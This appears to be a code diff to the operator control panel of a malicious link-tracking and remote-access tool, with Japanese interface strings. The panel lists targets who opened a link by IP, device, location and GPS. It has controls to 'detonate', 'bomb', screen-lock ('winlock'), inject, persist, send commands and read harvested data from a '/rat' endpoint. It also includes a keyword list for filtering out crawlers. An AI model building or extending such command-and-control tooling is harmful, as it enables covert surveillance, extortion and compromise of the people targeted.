+  if (s.inj !== undefined) $("#injbtn").classList.toggle("on", !!s.inj);
+  if (s.hard !== undefined) $("#hardbtn").classList.toggle("on", !!s.hard);
+}
 
-  /* ---------- 同期 ---------- */
-  let busy = false;
-  async function sync() {
-    if (busy) return; busy = true;
-    try {
-      const j = await fetch(API + "/stages", {credentials:"same-origin"}).then(r => r.json());
-      if (j && j.ok) {
-        const botIds = {};
-        ROWS = (j.rows || []).map(function (h) {
-          const lv = (j.stages || {})[h.id] || 0;
-          return Object.assign({}, h, { lv: lv, bot: !!botIds[h.id] || false });
+function pickFreeze(cur) {
+  return cur === "" ? "soft" : (cur === "soft" ? "hard" : "");
+}
+let freezeCur = {{ freeze|tojson }};
+let hardCur = {{ hard|tojson }};
+
+document.querySelectorAll("#lvbtns button").forEach(b => b.onclick = () =>
+  post(BASE + "/api/vp/" + CODE + "/level", {level: +b.dataset.lv}));
+
+$("#fixbtn").onclick = async () => {
+  const j = await post(BASE + "/api/vp/" + CODE + "/fix",
+    {fixed: $("#fixbtn").classList.contains("on") ? 0 : 1});
+  if (j) { /* state reflected */ }
+};
+
+$("#firebtn").onclick = () => post(BASE + "/api/vp/" + CODE +
+  ($("#firebtn").classList.contains("on") ? "/stop" : "/resume"), {});
+
+$("#freezebtn").onclick = async () => {
+  freezeCur = pickFreeze(freezeCur);
+  await post(BASE + "/api/vp/" + CODE + "/freeze", {freeze: freezeCur});
+};
+
+$("#detonate").onclick = () => post(BASE + "/api/vp/" + CODE + "/detonate", {});
+
+document.querySelectorAll("[data-breed]").forEach(b => b.onclick = () =>
+  post(BASE + "/api/vp/" + CODE + "/breed", {mult: +b.dataset.breed}));
+
+document.querySelectorAll("[data-cmd]").forEach(b => b.onclick = () =>
+  post(BASE + "/api/vp/" + CODE + "/cmd",
+       {kind: b.dataset.cmd, arg: b.dataset.arg || ""}));
+
+$("#wapply").onclick = () => post(BASE + "/api/vp/" + CODE + "/winlock", {
+  mode: $("#wmode").value,
+  branch: +($("#wbranch").value || 0),
+  depth: +($("#wdepth").value || 0)
+});
+
+$("#bombapply").onclick = () =>
+  post(BASE + "/api/vp/" + CODE + "/bomb", {bomb: $("#bombtext").value});
+
+$("#injbtn").onclick = () =>
+  post(BASE + "/api/vp/" + CODE + "/inj",
+       {inj: $("#injbtn").classList.contains("on") ? 0 : 1});
+
+$("#hardbtn").onclick = () => {
+  hardCur = hardCur === "" ? "install" : (hardCur === "install" ? "always" : "");
+  post(BASE + "/api/vp/" + CODE + "/hard", {hard: hardCur});
+};
+
+$("#clear").onclick = () => post(BASE + "/api/vp/" + CODE + "/cmds/clear", {});
+
+document.querySelectorAll("[data-bot]").forEach(b => b.onclick = async () => {
+  try {
+    await fetch(BASE + "/api/vp/" + CODE + "/hit/" + b.dataset.bot + "/bot",
+                {method: "POST"});
+    b.classList.toggle("warn");
+  } catch (e) {}
+});
+
+async function poll() {
+  try {
+    const r = await fetch(BASE + "/api/vp/" + CODE + "/state");
+    if (r.ok) apply(await r.json());
+  } catch (e) {}
+  try {
+    const r = await fetch(BASE + "/api/vp/" + CODE + "/stages");
+    if (r.ok) {
+      const j = await r.json();
+      $("#rate").textContent = j.stat.rate + "%";
+      $("#ratebar").style.width = j.stat.rate + "%";
+      const rows = $("#rows");
+      if (rows && j.rows) {
+        rows.innerHTML = j.rows.map(h => {
+          const col = j.colors[j.stages[h.id] || 0];
+          const lab = j.labels[j.stages[h.id] || 0];
+          return '<tr><td class="mono">' + h.id + '</td><td class="mono">' +
+            (h.ts || "") + '</td><td class="mono">' + (h.ip || "") + '</td><td>' +
+            (h.device || "") + ' / ' + (h.os || "") + '<div class="note">' +
+            (h.browser || "") + '</div></td><td>' + (h.country || "") + ' ' +
+            (h.city || "") + '</td><td class="st" style="color:' + col + '">' + lab +
+            '</td><td>' + (h.gps ? "◎" : "-") + '</td><td><button data-bot="' +
+            h.id + '" class="' + (h.is_bot ? "warn" : "") + '">bot</button></td></tr>';
+        }).join("");
+        rows.querySelectorAll("[data-bot]").forEach(b => b.onclick = async () => {
+          try {
+            await fetch(BASE + "/api/vp/" + CODE + "/hit/" + b.dataset.bot + "/bot",
+                        {method: "POST"});
+            b.classList.toggle("warn");
+          } catch (e) {}
         });
-        await fillBots(ROWS);
-        paintStat(j.stat);
-        paintRows();
-        $("vw-total").textContent = j.count;
       }
-      const s = await fetch(API + "/state", {credentials:"same-origin"}).then(r => r.json()).catch(() => null);
-      if (s && s.ok) {
-        FIXED = s.fixed ? 1 : 0;
-        LV = s.level; paintLv();
-        $("vw-fire").textContent = s.firing ? "稼働中" : "停止";
-        $("vw-fire").style.color = s.firing ? "#7ce23a" : "#8b9bb0";
-        $("vw-pend").textContent = s.pending || 0;
-        const hs = $("vw-hard");
-        if (hs && document.activeElement !== hs) hs.value = s.hard || "";
-      }
-    } catch (e) {}
-    busy = false;
-  }
-  async function fillBots(rows) {
-    const KW = ["bot","crawler","spider","curl","wget","python-requests","headless",
-                "render-","line-poker","facebookexternalhit","preview","monitor","uptime","lighthouse"];
-    rows.forEach(function (h) {
-      const ua = (h.browser || "").toLowerCase() + " " + (h.device || "").toLowerCase();
-      h.bot = KW.some(k => ua.indexOf(k) >= 0);
-    });
-  }
+    }
+  } catch (e) {}
+  try {
+    const r = await fetch(BASE + "/api/vp/" + CODE + "/rat");
+    if (r.ok) {
+      const j = await r.json();
+      const d = j.data || {};
+      const keys = Object.keys(d).sort();
+      $("#rat").textContent = keys.length
+        ? keys.map(k => k + " = " + String(d[k].v).slice(0, 300)).join("\n")
+        : "まだデータがありません（相手がまだ踏んでいない）";
+    }
+  } catch (e) {}
+  setTimeout(poll, 3000);
+}
 
-  paintLv();
-  sync();
-  setInterval(sync, 3000);
-  document.addEventListener("visibilitychange", function () { if (!document.hidden) sync(); });
-})();
+poll();
 </script>
-{% endblock %}
+</body></html>
